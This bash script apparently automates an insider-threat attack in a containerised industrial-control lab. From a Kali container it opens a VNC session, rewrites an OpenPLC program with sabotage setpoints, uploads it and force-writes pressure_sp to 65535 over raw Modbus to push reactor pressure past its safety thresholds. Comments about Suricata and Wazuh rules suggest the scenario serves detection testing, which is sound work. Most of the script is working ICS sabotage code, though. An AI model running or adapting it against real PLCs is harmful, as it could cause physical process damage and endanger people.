#!/bin/bash

# Configuration
POMERIUM_IP="192.168.90.21"
PLC_URL="https://plc.localhost.pomerium.io"
KEYCLOAK_URL="http://192.168.100.20:8080/realms/master/protocol/openid-connect/token"
EWS_CONTAINER="EWS"
MALICIOUS_ST="/home/engineer/Desktop/chemical.st"

# Terminal Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_time() {
    echo -e "  ${CYAN}[TIME]${NC} $(date '+%Y-%m-%d %H:%M:%S.%3N')"
}

if [[ "$1" == "--restore" ]]; then
    echo -e "${YELLOW}==== RESTORING ORIGINAL PLC PROGRAM ====${NC}"
    docker exec $EWS_CONTAINER cp ${MALICIOUS_ST}.bak $MALICIOUS_ST
    echo -e "  [+] System restoration command sent."
    exit 0
fi

echo -e "${RED}==== SCENARIO B: Insider Threat — Machine Identity Sabotage ====${NC}"
echo ""

# Inject Pomerium gateway hostnames into Kali's /etc/hosts (Kali has no DNS for .pomerium.io)
docker exec kali sh -c "cat /etc/hosts | grep -v 'pomerium.io' > /tmp/hosts \
    && echo '${POMERIUM_IP} guacamole.localhost.pomerium.io authenticate.localhost.pomerium.io plc.localhost.pomerium.io' >> /tmp/hosts \
    && echo '192.168.100.20 keycloak.localhost.pomerium.io' >> /tmp/hosts \
    && cat /tmp/hosts > /etc/hosts"

# Inject Pomerium gateway hostnames into EWS /etc/hosts (EWS must use VLAN IP so source_ip policy matches)
docker exec $EWS_CONTAINER sh -c "cat /etc/hosts | grep -v 'pomerium.io\|keycloak' > /tmp/hosts \
    && echo '${POMERIUM_IP} authenticate.localhost.pomerium.io plc.localhost.pomerium.io' >> /tmp/hosts \
    && echo '192.168.100.20 keycloak.localhost.pomerium.io' >> /tmp/hosts \
    && cat /tmp/hosts > /etc/hosts"

# --- STEP 1 & 2: GUACAMOLE VNC SESSION ---
echo -e "[*] Step 1: Navigating to Zero-Trust Gateway (Guacamole)..."
log_time
# Clean up any leftover signal files from previous runs
docker exec kali rm -f /tmp/guac_ready.txt /tmp/guac_stop.txt 2>/dev/null || true
# Run playwright Guacamole automation in background from Kali, capturing output for diagnostics
docker exec -u kali kali bash -c 'nohup python3 /home/kali/attack_logic/tools/playwright_guacamole.py > /tmp/guac_pw_log.txt 2>&1 &'

sleep 8
echo -e "[*] Step 2: Opening remote desktop session (VNC) to EWS..."
log_time

echo -e "  [i] Waiting for Guacamole VNC session to establish via Playwright..."
GUAC_READY=0
for i in {1..30}; do
    if docker exec kali test -f /tmp/guac_ready.txt; then
        GUAC_READY=1
        break
    fi
    sleep 2
done

if [ "$GUAC_READY" -eq 1 ]; then
    echo -e "  ${GREEN}[SUCCESS]${NC} Guacamole connection established. Attacker now has desktop access to EWS."
else
    echo -e "  ${RED}[TIMEOUT]${NC} Guacamole VNC session did not establish within 60s."
    echo -e "  [!] Playwright log:"
    docker exec kali cat /tmp/guac_pw_log.txt 2>/dev/null | sed 's/^/      /'
    echo -e "  [!] Scenario B continuing but VNC session state is unconfirmed."
fi
echo ""

# --- STEP 3: MODIFY PLC PROGRAM ON EWS (FIM TRIGGER) ---
echo -e "[*] Step 3: Modifying PLC program on EWS (chemical.st)..."
log_time

# Apply sabotage values and add a unique comment to force FIM trigger
docker exec $EWS_CONTAINER cp $MALICIOUS_ST ${MALICIOUS_ST}.bak
# Modify in a single pass piped into the same inode via redirection (preserves inode for FIM inotify watch)
SABOTAGE_TAG="sabotage_v5_$(date +%s)"
docker exec $EWS_CONTAINER bash -c "
  sed 's/override_sp_real : REAL := .*/override_sp_real : REAL := 3150.0; (* ${SABOTAGE_TAG} *) /' $MALICIOUS_ST \
  | sed 's/pressure_sp AT %MW2 : UINT := .*/pressure_sp AT %MW2 : UINT := 65535;/' \
  > /tmp/.st_tmp && cat /tmp/.st_tmp > $MALICIOUS_ST && rm /tmp/.st_tmp
"
echo -e "  ${GREEN}[+]${NC} chemical.st modified with sabotage values."
sleep 15

# --- STEP 4: Logging into PLC Console and uploading malicious program ---
echo -e "[*] Step 4: Logging into PLC Console and uploading malicious program..."
log_time

# Install requests on EWS if missing (required by pomerium_plc_login.py)
docker exec $EWS_CONTAINER python3 -c "import requests" 2>/dev/null || \
    docker exec $EWS_CONTAINER pip3 install requests -q

# Pass exploit tool from Kali to EWS (Simulated Lateral Movement / Tool Transfer)
echo -e "  [i] Passing custom exploit tools from Kali to EWS..."
docker cp kali:/home/kali/attack_logic/tools/pomerium_plc_login.py /tmp/pomerium_plc_login.py > /dev/null 2>&1
docker cp /tmp/pomerium_plc_login.py $EWS_CONTAINER:/home/engineer/pomerium_plc_login.py > /dev/null 2>&1
docker exec $EWS_CONTAINER chown engineer:engineer /home/engineer/pomerium_plc_login.py > /dev/null 2>&1
rm /tmp/pomerium_plc_login.py

# Direct API login & upload through Pomerium proxy (Fires Suricata 1000101 → Wazuh 100060)
echo -e "  [i] Executing automated PLC management commands..."
docker exec $EWS_CONTAINER python3 /home/engineer/pomerium_plc_login.py /home/engineer/Desktop/chemical.st

# pomerium_plc_login.py polls until compilation done then calls start_plc.
# Force-write pressure_sp (%MW2 = HR[1026]) to 65535 via PLC localhost Modbus.
# OpenPLC shared memory retains the previous value across restarts; this activates the sabotage setpoint.
echo -e "  [i] Activating sabotage setpoint via PLC Modbus (pressure_sp = 65535)..."
sleep 5
docker exec plc python3 -c "
import socket, struct, time
for attempt in range(10):
    try:
        s = socket.socket(); s.settimeout(3); s.connect(('127.0.0.1', 502))
        req = struct.pack('>HHHBBHH', 1, 0, 6, 1, 6, 1026, 65535)
        s.send(req); s.recv(256); s.close()
        print('  [+] pressure_sp forced to 65535 via Modbus FC6.')
        break
    except Exception as e:
        time.sleep(3)
        if attempt == 9: print('  [!] Modbus write failed:', e)
" 2>&1
echo -e "  ${GREEN}[+]${NC} Sabotaged program active."


# --- STEP 5: MONITOR PROCESS SABOTAGE ---
echo -e "[*] Step 5: Monitoring Reactor Pressure Increase (Physical Sabotage)..."
log_time
echo -e "  [i] Sabotaged program active. Waiting for physical process impact..."
# 120s window: allows PLC to reconnect to simulation and drive pressure above 90%/97% thresholds
sleep 120
echo -e "  ${GREEN}[+]${NC} Process impact window complete."

# --- STEP 6: CLOSE VNC SESSION ---
echo -e "[*] Step 6: Closing Guacamole session..."
docker exec kali touch /tmp/guac_stop.txt
sleep 3

echo ""
echo -e "${YELLOW}==== SCENARIO B COMPLETE ====${NC}"
